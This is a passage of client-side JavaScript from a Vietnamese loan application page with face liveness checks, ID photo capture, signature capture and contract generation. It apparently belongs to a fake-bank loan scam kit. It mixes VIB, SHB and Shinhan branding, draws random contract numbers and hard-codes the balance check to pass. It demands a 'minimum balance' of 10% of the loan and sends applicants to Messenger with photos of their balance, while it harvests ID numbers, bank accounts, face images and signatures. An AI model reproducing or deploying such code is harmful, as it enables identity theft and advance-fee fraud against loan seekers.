            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;

            await Promise.all([
                faceapi.nets.ssdMobilenetv1.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/models'),
                faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/models'),
                faceapi.nets.faceRecognitionNet.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/models')
            ]);

            let detections = await faceapi.detectSingleFace(video).withFaceLandmarks();
            if (!detections) {
                showToast("Vui lòng đưa khuôn mặt vào khung tròn.");
                showRetryButton();
                stream.getTracks().forEach(track => track.stop());
                return;
            }

            const eyeDistance = Math.abs(detections.landmarks.positions[36].x - detections.landmarks.positions[45].x);
            if (eyeDistance < 50) {
                showToast("Vui lòng tháo kính/mũ để xác minh.");
                showRetryButton();
                stream.getTracks().forEach(track => track.stop());
                return;
            }

            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext("2d").drawImage(video, 0, 0);
            const imageData = canvas.getImageData(0, 0, canvas.width, canvas.height).data;
            let brightness = 0;
            for (let i = 0; i < imageData.length; i += 4) {
                brightness += (imageData[i] + imageData[i + 1] + imageData[i + 2]) / 3;
            }
            brightness /= (imageData.length / 4);
            if (brightness < 50) {
                showToast("Ánh sáng yếu, vui lòng chụp ở nơi sáng hơn.");
                showRetryButton();
                stream.getTracks().forEach(track => track.stop());
                return;
            }

            $("#faceScanGuide").text("Vui lòng nháy mắt trái.");
            await new Promise(resolve => setTimeout(resolve, 2000));
            detections = await faceapi.detectSingleFace(video).withFaceLandmarks();
            if (!detections) {
                showToast("Không phát hiện khuôn mặt, vui lòng thử lại.");
                showRetryButton();
                stream.getTracks().forEach(track => track.stop());
                return;
            }
            const leftEyeRatio = (Math.abs(detections.landmarks.positions[37].y - detections.landmarks.positions[41].y) /
                                 Math.abs(detections.landmarks.positions[36].x - detections.landmarks.positions[39].x));
            if (leftEyeRatio > 0.2) {
                showToast("Vui lòng nháy mắt trái đúng cách.");
                showRetryButton();
                stream.getTracks().forEach(track => track.stop());
                return;
            }

            $("#faceScanGuide").text("Vui lòng quay đầu sang trái.");
            await new Promise(resolve => setTimeout(resolve, 2000));
            detections = await faceapi.detectSingleFace(video).withFaceLandmarks();
            if (!detections || detections.landmarks.positions[0].x > detections.landmarks.positions[33].x) {
                showToast("Vui lòng quay đầu sang trái đúng hướng dẫn.");
                showRetryButton();
                stream.getTracks().forEach(track => track.stop());
                return;
            }

            $("#faceScanGuide").text("Vui lòng quay đầu sang phải.");
            await new Promise(resolve => setTimeout(resolve, 2000));
            detections = await faceapi.detectSingleFace(video).withFaceLandmarks();
            if (!detections || detections.landmarks.positions[0].x < detections.landmarks.positions[33].x) {
                showToast("Vui lòng quay đầu sang phải đúng hướng dẫn.");
                showRetryButton();
                stream.getTracks().forEach(track => track.stop());
                return;
            }

            canvas.toBlob(blob => {
                const file = new File([blob], "face_photo.jpg", { type: "image/jpeg" });
                formData.facePhoto = file;
                $("#faceScanGuide").text("Xác minh thành công!");
                showToast("Xác minh khuôn mặt thành công!", "success");
                $('#faceScanNext').prop('disabled', false);
                $('#retryFaceScan').hide();
                stream.getTracks().forEach(track => track.stop());
            }, "image/jpeg", 0.8);
        } catch (error) {
            console.error("Lỗi xác minh khuôn mặt:", error);
            showToast("Lỗi xác minh khuôn mặt, vui lòng thử lại.");
            showRetryButton();
        } finally {
            $("#loadingOverlay").removeClass("active");
        }
    };

    window.retryFaceScan = function() {
        $('#retryFaceScan').hide();
        $('#faceScanGuide').text("Vui lòng nhìn thẳng vào camera.");
        verifyFace();
    };

    function showRetryButton() {
        $('#retryFaceScan').show();
        $('#faceScanNext').prop('disabled', true);
    }

    window.openCamera = function() {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                const video = document.createElement("video");
                video.srcObject = stream;
                video.play();
                const container = document.createElement("div");
                container.style.position = "fixed";
                container.style.top = "50%";
                container.style.left = "50%";
                container.style.transform = "translate(-50%, -50%)";
                container.style.background = "#fff";
                container.style.padding = "20px";
                container.style.borderRadius = "12px";
                container.style.zIndex = "3000";
                container.appendChild(video);

                const captureButton = document.createElement("button");
                captureButton.textContent = "Chụp ảnh";
                captureButton.className = "vib-v2-btn-dk02";
                captureButton.style.marginTop = "10px";
                captureButton.onclick = () => {
                    const canvas = document.createElement("canvas");
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext("2d").drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const file = new File([blob], "camera_photo.jpg", { type: "image/jpeg" });
                        const input = document.querySelector('input[type="file"]:focus') || document.querySelector('input[name="idPhotoFront"]');
                        const dataTransfer = new DataTransfer();
                        dataTransfer.items.add(file);
                        input.files = dataTransfer.files;
                        input.dispatchEvent(new Event("change"));
                        stream.getTracks().forEach(track => track.stop());
                        container.remove();
                    }, "image/jpeg", 0.8);
                };

                container.appendChild(captureButton);
                document.body.appendChild(container);
            })
            .catch(error => {
                console.error("Lỗi truy cập camera:", error);
                showToast("Cần cấp quyền camera.");
            });
    };

    window.openCameraForBalance = async function() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement("video");
            video.srcObject = stream;
            video.play();
            showToast("Chụp ảnh số dư và gửi qua Messenger để duyệt trong 1 giờ.", "success");
            setTimeout(() => {
                window.location.href = 'https://m.me/ShinhanBankVietnam';
                stream.getTracks().forEach(track => track.stop());
            }, 2000);
        } catch (error) {
            console.error("Lỗi truy cập camera:", error);
            showToast("Cần cấp quyền camera.");
        }
    };

    function initSignatureCanvas() {
        const canvas = document.getElementById('signatureCanvas');
        const ctx = canvas.getContext('2d');
        let isDrawing = false;

        canvas.addEventListener('mousedown', (e) => {
            isDrawing = true;
            ctx.beginPath();
            ctx.moveTo(e.offsetX, e.offsetY);
        });

        canvas.addEventListener('mousemove', (e) => {
            if (isDrawing) {
                ctx.lineTo(e.offsetX, e.offsetY);
                ctx.strokeStyle = '#000';
                ctx.lineWidth = 2;
                ctx.stroke();
            }
        });

        canvas.addEventListener('mouseup', () => {
            isDrawing = false;
            signatureData = canvas.toDataURL('image/png');
            document.getElementById('signaturePreview').src = signatureData;
            document.getElementById('signaturePreview').style.display = 'block';
            document.getElementById('clearSignature').style.display = 'inline-block';
        });

        canvas.addEventListener('touchstart', (e) => {
            isDrawing = true;
            const touch = e.touches[0];
            const rect = canvas.getBoundingClientRect();
            ctx.beginPath();
            ctx.moveTo(touch.clientX - rect.left, touch.clientY - rect.top);
            e.preventDefault();
        });

        canvas.addEventListener('touchmove', (e) => {
            if (isDrawing) {
                const touch = e.touches[0];
                const rect = canvas.getBoundingClientRect();
                ctx.lineTo(touch.clientX - rect.left, touch.clientY - rect.top);
                ctx.strokeStyle = '#000';
                ctx.lineWidth = 2;
                ctx.stroke();
            }
            e.preventDefault();
        });

        canvas.addEventListener('touchend', () => {
            isDrawing = false;
            signatureData = canvas.toDataURL('image/png');
            document.getElementById('signaturePreview').src = signatureData;
            document.getElementById('signaturePreview').style.display = 'block';
            document.getElementById('clearSignature').style.display = 'inline-block';
        });
    }

    window.startSigning = function() {
        const useDocuSign = confirm('Bạn muốn ký hợp đồng qua DocuSign (khuyến nghị) hay vẽ chữ ký trực tiếp?');
        if (useDocuSign) {
            signWithDocuSign();
        } else {
            document.getElementById('signatureCanvas').style.display = 'block';
            document.getElementById('startSigning').style.display = 'none';
            initSignatureCanvas();
        }
    };

    window.clearSignature = function() {
        const canvas = document.getElementById('signatureCanvas');
        const ctx = canvas.getContext('2d');
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        signatureData = null;
        document.getElementById('signaturePreview').style.display = 'none';
        document.getElementById('clearSignature').style.display = 'none';
        document.getElementById('signatureCanvas').style.display = 'none';
        document.getElementById('startSigning').style.display = 'inline-block';
    };

    async function signWithDocuSign() {
        try {
            showToast('Đang kết nối với DocuSign...', 'success');
            const response = await fetch('/docusign-sign', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    contractId: document.getElementById('contractId').textContent,
                    fullName: formData.fullName,
                    email: formData.email,
                    contractHtml: document.getElementById('contract-vay').outerHTML
                })
            });
            const result = await response.json();
            if (result.success) {
                signatureData = result.signatureUrl;
                document.getElementById('signaturePreview').src = signatureData;
                document.getElementById('signaturePreview').style.display = 'block';
                document.getElementById('clearSignature').style.display = 'inline-block';
                showToast('Ký hợp đồng thành công qua DocuSign!', 'success');
            } else {
                throw new Error('DocuSign signing failed');
            }
        } catch (error) {
            console.error("Lỗi ký DocuSign:", error);
            showToast('Lỗi khi ký qua DocuSign, chuyển sang ký trực tiếp.');
            document.getElementById('signatureCanvas').style.display = 'block';
            document.getElementById('startSigning').style.display = 'none';
            initSignatureCanvas();
        }
    }

    function generateQrCode(elementId, contractId) {
        const qrCodeUrl = `/track-loan/SHB-2025-${contractId}`;
        QRCode.toCanvas(document.getElementById(elementId), qrCodeUrl, {
            width: 100,
            margin: 1
        }, (error) => {
            if (error) console.error('Lỗi tạo QR Code:', error);
        });
    }

    function updateContractModal(data) {
        const contractId = Math.floor(100000 + Math.random() * 900000);
        const today = new Date().toLocaleDateString('vi-VN');
        $("#contractId, #disbursementContractId").text(contractId);
        $("#contractDate, #disbursementDate").text(today);
        $("#contractFullName, #disbursementFullName, #contractFullName2").text(data.fullName);
        $("#contractIdNumber, #disbursementIdNumber").text(data.idNumber);
        $("#contractIdIssueDate").text(data.idIssueDate);
        $("#contractIdIssuePlace").text(data.idIssuePlace);
        $("#contractPhone, #disbursementPhone").text(data.phone);
        $("#contractRelativePhone, #disbursementRelativePhone").text(data.relativePhone);
        $("#contractEmail, #disbursementEmail").text(data.email || "Không cung cấp");
        $("#contractAccountNumber, #disbursementAccountNumber").text(data.accountNumber);
        $("#contractBank, #disbursementBank").text(data.bank);
        $("#contractLoanAmount, #disbursementLoanAmount").text(parseInt(data.loanAmount).toLocaleString('vi-VN') + ' VND');
        $("#contractLoanTerm, #disbursementLoanTerm").text(data.loanTerm);
        $("#contractMonthlyPayment").text(data.monthlyPayment.toLocaleString('vi-VN') + ' VND');
        $("#contractInterestRate").text(getInterestRate(data.loanType, data.loanTerm) + '%');
        $("#disbursementMinimumBalance").text((data.loanAmount * 0.1).toLocaleString('vi-VN') + ' VND');
        $("#cifNo").text("CIF-" + contractId);
        $("#consentNo").text("CONSENT-" + contractId);
        $("#successFullName").text(data.fullName);
        $("#successLoanAmount").text(parseInt(data.loanAmount).toLocaleString('vi-VN') + ' VND');
        $("#successAccountNumber").text(data.accountNumber);
        $("#successBank").text(data.bank);
        $("#successMonthlyPayment").text(data.monthlyPayment.toLocaleString('vi-VN') + ' VND');
        $("#successInterestRate").text(getInterestRate(data.loanType, data.loanTerm) + '%');

        generateQrCode('contractQrCode', contractId);
        generateQrCode('disbursementQrCode', contractId);

        const pdfUrl = "assets/contracts/sample_contract.pdf";
        $("#contractIframe").attr("src", pdfUrl);
        $("#contractPreview").html('<iframe id="contractIframe" style="width: 100%; height: 400px;"></iframe>');
        $("#contractIframe").attr("src", pdfUrl);
    }

    window.downloadContract = function() {
        if (!signatureData) {
            showToast('Vui lòng ký hợp đồng trước khi tải.');
            return;
        }
        $("#loadingOverlay").addClass("active");
        const element = document.getElementById('contract-vay');
        const signatureImg = document.createElement('img');
        signatureImg.src = signatureData;
        signatureImg.style.maxWidth = '200px';
        signatureImg.style.marginTop = '8px';
        document.getElementById('contractFullName2').appendChild(signatureImg);

        html2pdf().from(element).set({
            filename: `HopDongVayTinChap_${formData.fullName}_${new Date().toLocaleDateString("vi-VN")}.pdf`,
            margin: 10,
            jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' }
        }).save().then(() => {
            $("#loadingOverlay").removeClass("active");
            showToast("Hợp đồng đã được tải.", "success");
            signatureImg.remove();
        }).catch(error => {
            console.error("Lỗi tải hợp đồng:", error);
            showToast("Lỗi tải hợp đồng, vui lòng thử lại.");
            $("#loadingOverlay").removeClass("active");
        });
    };

    window.downloadDisbursement = function() {
        const minimumBalance = formData.loanAmount * 0.1;
        const hasSufficientBalance = true; // Giả lập, thay bằng logic thực tế
        if (hasSufficientBalance) {
            $("#loadingOverlay").addClass("active");
            const element = document.getElementById('disbursement-confirmation');
            html2pdf().from(element).set({
                filename: `DieuKienGiaiNgan_${formData.fullName}_${new Date().toLocaleDateString("vi-VN")}.pdf`,
                margin: 10,
                jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' }
            }).save().then(() => {
                $("#loadingOverlay").removeClass("active");
                showToast("Điều kiện giải ngân đã được tải.", "success");
            }).catch(error => {
                console.error("Lỗi tải điều kiện giải ngân:", error);
                showToast("Lỗi tải điều kiện giải ngân, vui lòng thử lại.");
                $("#loadingOverlay").removeClass("active");
            });
        } else {
            showToast(`Số dư tài khoản chưa đáp ứng yêu cầu tối thiểu (${minimumBalance.toLocaleString('vi-VN')} VND).`);
        }
    };

    let chartUpdateTimeout;
    $("#loanAmount, #loanTerm, [name='loanType']").on("change", function() {
        clearTimeout(chartUpdateTimeout);
        chartUpdateTimeout = setTimeout(() => {
            const amount = parseCurrency($("#loanAmount").val());
            const term = parseInt($("#loanTerm").val());
            const loanType = $("[name='loanType']").val();
            if (amount && term && loanType) {
                const interestRate = getInterestRate(loanType, term);
                const monthlyPayment = calculateLoan(amount, term, interestRate);
                $("#interestRate").text(`${interestRate}%`);
                $("#monthlyPayment").text(monthlyPayment.toLocaleString('vi-VN') + ' VND');
                drawLoanChart(amount, term, interestRate);
            }
        }, 500);
    });

    $('[name="loanType"]').on('change', function() {
        const loanType = $(this).val();
        if (loanType === 'Vay mua nhà' || loanType === 'Vay mua xe') {
            $('#assetValueContainer').show();
            $('[name="assetValue"]').prop('required', true);
        } else {
            $('#assetValueContainer').hide();
            $('[name="assetValue"]').prop('required', false);
        }
    });

    // Khởi tạo camera khi vào bước 4
    $('#step-4').on('shown.bs.modal', function() {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                const video = document.getElementById('faceVideo');
                video.srcObject = stream;
                video.play();
            })
            .catch(error => {
                console.error("Lỗi truy cập camera:", error);
                showToast("Cần cấp quyền camera để xác minh khuôn mặt.");
            });
    });

    // Đóng stream camera khi rời bước 4
    $('#step-4').on('hidden.bs.modal', function() {
        const video = document.getElementById('faceVideo');
        if (video.srcObject) {
            video.srcObject.getTracks().forEach(track => track.stop());
        }
    });

});
</script>
